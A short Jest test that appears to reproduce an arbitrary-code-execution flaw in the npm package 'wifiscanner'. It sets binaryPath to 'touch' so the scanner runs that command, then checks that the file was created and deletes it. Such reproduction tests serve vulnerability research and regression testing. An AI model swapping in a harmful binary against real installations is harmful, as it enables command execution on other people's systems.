test("Arbitrary code execution in wifiscanner", () => {
  expect.assertions(1);
  const fs = require("fs");
  let wifiscanner = require("wifiscanner");
  const sleep = require("sleep");
  const path = "./wifiscanner.txt";
  let options = {
    args: "./wifiscanner.txt",
    binaryPath: "touch",
  };
  try {
    let scanner = wifiscanner(options);
    scanner.scan(function (error, networks) {});
  } catch (error) {
    console.log(error);
  }
  sleep.sleep(2);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
